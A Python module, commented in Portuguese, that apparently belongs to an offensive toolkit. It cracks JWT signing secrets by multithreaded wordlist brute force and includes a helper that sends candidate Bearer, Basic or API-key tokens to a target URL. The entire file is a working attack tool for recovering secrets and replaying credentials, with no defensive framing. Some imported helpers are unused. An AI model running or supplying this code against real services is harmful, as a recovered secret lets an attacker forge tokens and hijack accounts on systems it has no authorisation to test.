"""
Módulo avançado para força bruta e fuzzing de tokens modernos (JWT, OAuth, Bearer, API Keys, etc).
"""

import jwt
import requests
import threading
import queue
import time
import logging
import os
import sys
import signal
from utils.logger import logger
from utils.request_builder import build_headers
from utils.helpers import mutate_jwt, is_jwt
from termcolor import cprint

logging.basicConfig(filename='logs/token_bruteforce.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

TOKEN_TYPES = ["jwt", "oauth", "basic", "bearer", "api", "verification", "custom"]

class TokenBruteforcer:
    def __init__(self, token, target_url=None, algorithm="HS256"):
        self.token = token
        self.target_url = target_url
        self.algorithm = algorithm
        self.found_secret = None
        self.stop_flag = threading.Event()
        self.wordlist_position = 0
        self.total_tested = 0
        
        logging.info(f"Inicializando TokenBruteforcer para token: {token[:20]}...")
    
    def test_secret(self, secret):
        """
        Testa se um segredo específico pode verificar o token JWT.
        
        Args:
            secret: Segredo a ser testado
            
        Returns:
            True se o segredo é válido, False caso contrário
        """
        try:
            # Tentar decodificar o token com o segredo
            jwt.decode(self.token, secret, algorithms=[self.algorithm])
            return True
        except jwt.exceptions.InvalidSignatureError:
            # Assinatura inválida
            return False
        except Exception as e:
            # Outro erro
            logging.debug(f"Erro ao testar segredo: {str(e)}")
            return False
    
    def _bruteforce_worker(self, secrets_queue, results, thread_id):
        """
        Worker de thread para bruteforce.
        
        Args:
            secrets_queue: Fila de segredos para testar
            results: Lista compartilhada para armazenar resultados
            thread_id: ID da thread para registro
        """
        while not secrets_queue.empty() and not self.stop_flag.is_set():
            try:
                secret = secrets_queue.get(block=False)
                self.total_tested += 1
                
                if self.total_tested % 1000 == 0:
                    logging.info(f"Thread {thread_id}: Testados {self.total_tested} segredos")
                
                if self.test_secret(secret):
                    # Encontrou o segredo!
                    logging.info(f"Thread {thread_id}: Segredo encontrado! '{secret}'")
                    results.append(secret)
                    self.found_secret = secret
                    self.stop_flag.set()  # Sinaliza para outras threads pararem
                
                secrets_queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                logging.error(f"Erro na thread {thread_id}: {str(e)}")
                secrets_queue.task_done()
    
    def bruteforce(self, wordlist_file, num_threads=8):
        """
        Executa bruteforce em um arquivo de wordlist.
        
        Args:
            wordlist_file: Caminho para o arquivo de wordlist
            num_threads: Número de threads a serem usadas
            
        Returns:
            Dicionário com resultados do bruteforce
        """
        start_time = time.time()
        results = []
        
        try:
            # Verificar se o arquivo existe
            if not os.path.exists(wordlist_file):
                logging.error(f"Arquivo de wordlist não encontrado: {wordlist_file}")
                return {
                    'success': False,
                    'error': f"Arquivo de wordlist não encontrado: {wordlist_file}",
                    'tested': 0,
                    'time': 0
                }
            
            # Carregar segredos da wordlist para uma fila
            secrets_queue = queue.Queue()
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    secret = line.strip()
                    if secret:  # Ignora linhas vazias
                        secrets_queue.put(secret)
            
            total_secrets = secrets_queue.qsize()
            logging.info(f"Carregados {total_secrets} segredos da wordlist")
            
            # Iniciar threads de bruteforce
            threads = []
            for i in range(num_threads):
                t = threading.Thread(
                    target=self._bruteforce_worker,
                    args=(secrets_queue, results, i)
                )
                t.daemon = True
                threads.append(t)
                t.start()
            
            # Aguardar todas as threads terminarem
            for t in threads:
                t.join()
            
            end_time = time.time()
            duration = end_time - start_time
            
            if results:
                return {
                    'success': True,
                    'secret': results[0],  # Pega o primeiro segredo encontrado
                    'tested': self.total_tested,
                    'time': duration,
                    'rate': self.total_tested / duration if duration > 0 else 0
                }
            else:
                return {
                    'success': False,
                    'tested': self.total_tested,
                    'time': duration,
                    'rate': self.total_tested / duration if duration > 0 else 0
                }
                
        except Exception as e:
            logging.error(f"Erro durante bruteforce: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'tested': self.total_tested,
                'time': time.time() - start_time
            }
    
    def bruteforce_with_timeout(self, wordlist_file=None, timeout=60, num_threads=8):
        """
        Executa bruteforce com um limite de tempo.
        
        Args:
            wordlist_file: Caminho para o arquivo de wordlist
            timeout: Tempo limite em segundos
            num_threads: Número de threads a serem usadas
            
        Returns:
            Dicionário com resultados do bruteforce
        """
        # Verificar se um arquivo de wordlist foi fornecido
        if not wordlist_file:
            logging.error("Nenhum arquivo de wordlist fornecido")
            return {
                'success': False,
                'error': "Nenhum arquivo de wordlist fornecido",
                'tested': 0,
                'time': 0
            }
        
        start_time = time.time()
        results = []
        
        try:
            # Verificar se o arquivo existe
            if not os.path.exists(wordlist_file):
                logging.error(f"Arquivo de wordlist não encontrado: {wordlist_file}")
                return {
                    'success': False,
                    'error': f"Arquivo de wordlist não encontrado: {wordlist_file}",
                    'tested': 0,
                    'time': 0
                }
            
            # Carregar segredos da wordlist para uma fila
            secrets_queue = queue.Queue()
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    secret = line.strip()
                    if secret:  # Ignora linhas vazias
                        secrets_queue.put(secret)
            
            total_secrets = secrets_queue.qsize()
            logging.info(f"Carregados {total_secrets} segredos da wordlist")
            
            # Iniciar threads de bruteforce
            threads = []
            for i in range(num_threads):
                t = threading.Thread(
                    target=self._bruteforce_worker,
                    args=(secrets_queue, results, i)
                )
                t.daemon = True
                threads.append(t)
                t.start()
            
            # Aguardar pelo tempo limite
            timer_start = time.time()
            while time.time() - timer_start < timeout and not self.stop_flag.is_set():
                if secrets_queue.empty():
                    break
                time.sleep(0.1)
            
            # Marcar flag para parar as threads
            self.stop_flag.set()
            
            # Aguardar um pouco para as threads finalizarem
            for t in threads:
                t.join(0.5)
            
            end_time = time.time()
            duration = end_time - start_time
            
            if results:
                return {
                    'success': True,
                    'secret': results[0],  # Pega o primeiro segredo encontrado
                    'tested': self.total_tested,
                    'time': duration,
                    'rate': self.total_tested / duration if duration > 0 else 0
                }
            else:
                return {
                    'success': False,
                    'tested': self.total_tested,
                    'time': duration,
                    'rate': self.total_tested / duration if duration > 0 else 0,
                    'message': "Tempo limite atingido sem encontrar o segredo"
                }
                
        except Exception as e:
            logging.error(f"Erro durante bruteforce com timeout: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'tested': self.total_tested,
                'time': time.time() - start_time
            }

    def _try_token(self, token, token_type):
        headers = build_headers()
        if token_type in ["jwt", "bearer", "oauth"]:
            headers["Authorization"] = f"Bearer {token}"
        elif token_type == "basic":
            headers["Authorization"] = f"Basic {token}"
        elif token_type == "api":
            headers["X-API-KEY"] = token
        else:
            headers["Authorization"] = token
        try:
            response = requests.get(self.target_url, headers=headers, timeout=10)
            return response
        except Exception as e:
            logger.error(f"Erro ao tentar token: {e}")
            return None